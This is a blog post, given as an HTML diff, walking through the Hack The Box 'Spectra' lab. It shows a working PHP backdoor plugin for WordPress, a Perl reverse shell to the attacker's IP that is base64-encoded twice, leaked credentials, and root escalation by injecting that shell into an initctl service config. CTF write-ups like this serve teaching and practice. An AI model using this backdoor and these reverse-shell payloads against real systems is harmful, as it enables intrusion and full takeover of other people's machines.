@@ -1,0 +1,723 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.23.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB: Spectra Writeup - Alex Loney</title>
+<meta name="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+  <meta name="author" content="Alex Loney">
+  
+  <meta property="article:author" content="Alex Loney">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Alex Loney">
+<meta property="og:title" content="HTB: Spectra Writeup">
+<meta property="og:url" content="/blog/writeup/htb/htb-spectra/">
+
+
+  <meta property="og:description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-08T12:22:00-07:00">
+
+
+
+
+
+
+<link rel="canonical" href="/blog/writeup/htb/htb-spectra/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Alex Loney Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Alex Loney
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/posts/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Alex Loney" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Alex Loney</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Software Engineer by trade and passion, everything else by curiosity</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="https://alexloney.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB: Spectra Writeup">
+    <meta itemprop="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+    <meta itemprop="datePublished" content="2021-06-08T12:22:00-07:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB: Spectra Writeup
+</h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</p>
+
+<hr />
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>I began this box with a standard <code class="language-plaintext highlighter-rouge">nmap</code> scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/spectra 10.10.10.229
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-08 13:01 EDT
+Nmap scan report <span class="k">for </span>10.10.10.229
+Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 closed ports
+PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+80/tcp   open  http             nginx 1.17.4
+3306/tcp open  mysql            MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+8081/tcp open  blackice-icecap?
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>46.10 seconds
+</code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>From the <code class="language-plaintext highlighter-rouge">nmap</code> enumeration, there were a few interesting ports, but checking out port <code class="language-plaintext highlighter-rouge">80</code> to begin with, that lead to a simple homepage which listed two linkes, one went to a Wordpress website and the second went to what appears to be a copy of it that allows directory listing. There was one interesting file in the directory, which was a copy of the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file with a different extension, <code class="language-plaintext highlighter-rouge">wp-config.php.save</code>. Looking at that file, we have some potential MySQL credentials:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
+<span class="cd">/** The name of the database for WordPress */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'dev'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL database username */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'devtest'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL database password */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'devteam01'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL hostname */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>
+</code></pre></div></div>
+
+<p>Credentials noted for future reference, if needed. Attempting to log into the MySQL DB just results in a failure that my IP is unauthorized.</p>
+
+<p>Visiting the Wordpress site at <code class="language-plaintext highlighter-rouge">/main</code> reveals a working Wordpress installation with one post from an <code class="language-plaintext highlighter-rouge">administrator</code>. Visiting <code class="language-plaintext highlighter-rouge">wp-admin.php</code> prompts for a login, which successfully works using the database password from earlier</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: administrator
+Password: devteam01
+</code></pre></div></div>
+
+<p>The Admin panel doesn’t appear to be able to modify theme files, so I resorted to uploading a malicious plugin. <a href="https://www.hackingarticles.in/wordpress-reverse-shell/">See here for details on obtaining a reverse shell through WordPress</a>. I crafted a WordPress plugin to allow command execution:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>rshell.php
+&lt;?php
+
+/<span class="k">**</span>
+ <span class="k">*</span> Plugin Name: Wordpress Reverse Shell
+ <span class="k">*</span> Author: Me
+ <span class="k">*</span>/
+
+<span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])){</span>
+        <span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
+        <span class="nv">$cmd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>
+        system<span class="o">(</span><span class="nv">$cmd</span><span class="o">)</span><span class="p">;</span>
+        <span class="nb">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+        die<span class="p">;</span>
+<span class="o">}</span>
+
+?&gt;
+
+Usage: http://target.com/simple-backdoor.php?cmd<span class="o">=</span><span class="nb">cat</span>+/etc/passwd
+                                                                                                                                                                                                                                             
+<span class="nv">$ </span>zip rshell.zip rshell.php          
+updating: rshell.php <span class="o">(</span>deflated 30%<span class="o">)</span>
+</code></pre></div></div>
+
+<p>In WordPress admin, I selected Plugins -&gt; Add New -&gt; Browse -&gt; Upload -&gt; Activate. This allowed me to upload and activate this malicious WordPress plugin to obtain a backdoor. The backdoor is then uploaded at <code class="language-plaintext highlighter-rouge">http://10.10.10.229/main/wp-content/plugins/rshell/rshell.php</code>.</p>
+
+<p>With the backdoor uploaded, I can play with different command execution and determine information about the machine. I had issues using a standard <code class="language-plaintext highlighter-rouge">bash</code> reverse shell, so I resorted to using a <code class="language-plaintext highlighter-rouge">perl</code> reverse shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.10.14.204";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<p>However, some of the values in that string (specifically the <code class="language-plaintext highlighter-rouge">&amp;</code> character) will cause issues in a URL, so I base64 encoded the payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMjA0IjskcD05MDAwO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycK
+</code></pre></div></div>
+
+<p>However, that payload contains a <code class="language-plaintext highlighter-rouge">+</code> character, which I suspect will also cause issues as it may get treated as a space. So I base64 encoded it again:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s=
+</code></pre></div></div>
+
+<p>That looks better! So to execute this, we must base64 decode it twice and send that to bash.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s= | base64 -d | base64 -d | bash
+</code></pre></div></div>
+
+<p>Crafting this into a payload to our PHP backdoor we get:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.229/main/wp-content/plugins/rshell/rshell.php?cmd=echo%20Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s=%20|%20base64%20-d%20|%20base64%20-d%20|%20bash
+</code></pre></div></div>
+
+<p>And catching it with a netcat listener:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lnvp 9000
+</code></pre></div></div>
+
+<p>Which receives a successful callback!</p>
+
+<h1 id="privesc">Privesc</h1>
+
+<p>Now that we’re logged in as the <code class="language-plaintext highlighter-rouge">nginx</code> user, we can begin enumeration. Running linpeas, it highlighted a few things including:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
+SummerHereWeCome!!
+</code></pre></div></div>
+
+<p>That’s interesting! Trying that as the <code class="language-plaintext highlighter-rouge">root</code> user didn’t work, but trying that as the <code class="language-plaintext highlighter-rouge">katie</code> user worked! We have a user SSH shell!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: katie
+Password: SummerHereWeCome!!
+</code></pre></div></div>
+
+<p>Checking what <code class="language-plaintext highlighter-rouge">katie</code> can do, it looks like we have sudo permission to run a program:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+User katie may run the following commands on spectra:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">/sbin/initctl</code> program appears to be for starting and stopping services which are located in the <code class="language-plaintext highlighter-rouge">/etc/init</code> directory. Looking in that directory there are a few interesting services:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-larth</span>
+total 768K
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test9.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test8.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test7.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test6.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test5.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test4.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test3.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test2.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test10.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test1.conf
+<span class="nt">-rw-rw----</span>  1 root developers  478 Jun 29  2020 test.conf
+...<span class="o">{</span>snip<span class="o">}</span>...
+</code></pre></div></div>
+
+<p>Interesting, the group <code class="language-plaintext highlighter-rouge">developers</code> has read/write access to these files, are we in that group?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">groups
+</span>katie developers
+</code></pre></div></div>
+
+<p>Great! We can update these files! I then updated the <code class="language-plaintext highlighter-rouge">test1</code> file to add a reverse shell to it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>test1.conf
+...<span class="o">{</span>snip<span class="o">}</span>...
+pre-start script
+    perl <span class="nt">-e</span> <span class="s1">'use Socket;$i="10.10.14.204";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+    <span class="nb">echo</span> <span class="s2">"[</span><span class="sb">`</span><span class="nb">date</span><span class="sb">`</span><span class="s2">] Node Test Starting"</span> <span class="o">&gt;&gt;</span> /var/log/nodetest.log
+end script
+...<span class="o">{</span>snip<span class="o">}</span>...
+</code></pre></div></div>
+
+<p>Starting this with the command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl start test1
+</code></pre></div></div>
+
+<p>And catching the reverse shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9001
+</code></pre></div></div>
+
+<p>We successfully become root!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-easy" class="page__taxonomy-item" rel="tag">htb easy</a><span class="sep">, </span>
+    
+      <a href="/tags/#offsec" class="page__taxonomy-item" rel="tag">offsec</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#blog" class="page__taxonomy-item" rel="tag">blog</a><span class="sep">, </span>
+    
+      <a href="/categories/#htb" class="page__taxonomy-item" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/categories/#writeup" class="page__taxonomy-item" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-06-08T12:22:00-07:00">June 8, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HTB%3A+Spectra+Writeup%20%2Fblog%2Fwriteup%2Fhtb%2Fhtb-spectra%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-spectra%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-spectra%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/blog/new-blog-who-dis/" class="pagination--pager" title="New Blog Who Dis
+">Previous</a>
+    
+    
+      <a href="/blog/writeup/htb/htb-tenet/" class="pagination--pager" title="HTB: Tenet Writeup
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-tenet/" rel="permalink">HTB: Tenet Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/new-blog-who-dis/" rel="permalink">New Blog Who Dis
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">I’d like to welcome you to my blog!!
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Alex Loney. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
